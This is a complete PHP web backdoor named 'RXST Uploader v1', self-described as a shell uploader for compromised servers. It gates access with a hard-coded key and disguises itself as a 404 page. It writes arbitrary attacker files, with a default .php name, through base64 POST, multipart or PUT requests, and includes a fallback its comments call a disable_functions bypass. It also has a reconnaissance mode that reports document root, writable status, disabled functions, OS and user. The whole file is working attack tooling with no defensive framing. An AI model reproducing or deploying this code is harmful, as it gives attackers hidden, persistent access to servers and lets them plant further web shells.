<?php
/* ============================================================
   RXST Uploader v1 — single-file shell uploader
   key      : ee41lre9pc4b  (param k)
   protocol :
     1) POST action=v3  + n=<filename> + d=<base64 data>   [no multipart]
     2) multipart       + file field 'f' (+ optional n= rename)
     3) PUT body        + ?n=<filename>
   dir      : c=<subdir> (created if missing; default = uploader dir)
   response : JSON {"success":true,"file":"<ABS PATH>","method":"Vx"}
   ============================================================ */

$K = 'ee41lre9pc4b';

// ---- auth -----------------------------------------------------------------
$ik = isset($_REQUEST['k']) ? $_REQUEST['k'] : '';
if ($ik !== $K) {
    http_response_code(404);
    die('404 Not Found');
}

// ---- helpers ----------------------------------------------------------------
function rx_dir($sub) {
    $base = __DIR__;
    if ($sub === '' || $sub === null) return $base;
    $sub = str_replace('\\', '/', $sub);
    $sub = preg_replace('#\.\.+#', '', $sub);         // no traversal out
    $sub = trim($sub, '/');
    $p = $base . '/' . $sub;
    if (!is_dir($p)) @mkdir($p, 0755, true);
    return is_dir($p) ? $p : $base;
}

function rx_safe_name($n) {
    $n = str_replace('\\', '/', (string)$n);
    $n = basename($n);                                // strip any path
    if ($n === '' || $n === '.' || $n === '..') $n = 'rx_' . substr(md5((string)microtime(true)), 0, 8) . '.php';
    return $n;
}

function rx_write($path, $data) {
    // primary: file_put_contents | fallback: fopen/fwrite (disable_functions bypass)
    if (function_exists('file_put_contents')) {
        $r = @file_put_contents($path, $data);
        if ($r !== false && $r === strlen($data)) return true;
    }
    $fh = @fopen($path, 'w');
    if ($fh === false) return false;
    $w = @fwrite($fh, $data);
    @fclose($fh);
    return ($w !== false && $w === strlen($data));
}

function rx_reply($ok, $file, $method, $extra = null) {
    header('Content-Type: application/json');
    $o = array('success' => (bool)$ok, 'file' => $file, 'method' => $method);
    if ($extra !== null) $o['size'] = $extra;
    echo json_encode($o);
    exit;
}

// ---- routing ----------------------------------------------------------------
$dir    = rx_dir(isset($_REQUEST['c']) ? $_REQUEST['c'] : '');
$action = isset($_REQUEST['action']) ? strtolower($_REQUEST['action']) : '';

// MODE V3 : n= + d= (base64), plain POST body — simplest, no multipart
if ($action === 'v3' && isset($_POST['n'], $_POST['d'])) {
    $name = rx_safe_name($_POST['n']);
    $raw  = base64_decode($_POST['d'], true);
    if ($raw === false) rx_reply(false, '', 'V3', 'bad_base64');
    $path = $dir . '/' . $name;
    rx_write($path, $raw)
        ? rx_reply(true, $path, 'V3', strlen($raw))
        : rx_reply(false, $path, 'V3', 'write_failed');
}

// MODE V1/V2 : multipart upload, file field 'f'
if (isset($_FILES['f']) && is_array($_FILES['f'])) {
    $up = $_FILES['f'];
    $name = rx_safe_name(isset($_REQUEST['n']) && $_REQUEST['n'] !== '' ? $_REQUEST['n'] : $up['name']);
    $path = $dir . '/' . $name;
    $ok = false;
    if (isset($up['tmp_name']) && is_uploaded_file($up['tmp_name'])) {
        $ok = @move_uploaded_file($up['tmp_name'], $path);
        if (!$ok) { // fallback: copy / stream read + fwrite
            $data = @file_get_contents($up['tmp_name']);
            if ($data !== false) $ok = rx_write($path, $data);
        }
    } elseif (isset($up['error']) && $up['error'] !== UPLOAD_ERR_OK) {
        rx_reply(false, '', 'V1', 'upload_err_' . $up['error']);
    }
    $ok ? rx_reply(true, $path, 'V1', @filesize($path))
        : rx_reply(false, $path, 'V1', 'write_failed');
}

// MODE PUT : raw body, filename via ?n=
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'PUT' && isset($_REQUEST['n'])) {
    $body = file_get_contents('php://input');
    if ($body === '' || $body === false) rx_reply(false, '', 'PUT', 'empty_body');
    $name = rx_safe_name($_REQUEST['n']);
    $path = $dir . '/' . $name;
    rx_write($path, $body)
        ? rx_reply(true, $path, 'PUT', strlen($body))
        : rx_reply(false, $path, 'PUT', 'write_failed');
}

// MODE INFO : capability probe
if ($action === 'info') {
    header('Content-Type: application/json');
    echo json_encode(array(
        'success'  => true,
        'name'     => 'RXST Uploader v1',
        'cwd'      => __DIR__,
        'docroot'  => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : null,
        'writable' => is_writable(__DIR__),
        'php'      => PHP_VERSION,
        'disabled' => ini_get('disable_functions'),
        'os'       => PHP_OS,
        'user'     => function_exists('get_current_user') ? @get_current_user() : null,
    ));
    exit;
}

// ---- default: stealth form (browser drop) ------------------------------------
header('Content-Type: text/html');
?><!DOCTYPE html><html><head><title>404 Not Found</title></head>
<body style="background:#111;color:#0f0;font-family:monospace">
<h3>RXST Uploader</h3>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="k" value="<?php echo htmlspecialchars($K); ?>">
<input type="text" name="c" placeholder="subdir (optional)" style="background:#222;color:#0f0;border:1px solid #0f0;padding:4px">
<input type="text" name="n" placeholder="rename to (optional)" style="background:#222;color:#0f0;border:1px solid #0f0;padding:4px"><br><br>
<input type="file" name="f" style="color:#0f0">
<button style="background:#222;color:#0f0;border:1px solid #0f0;padding:4px 12px">UPLOAD</button>
</form>
<?php if (isset($_GET['done'])) echo '<pre>' . htmlspecialchars($_GET['done']) . '</pre>'; ?>
</body></html>
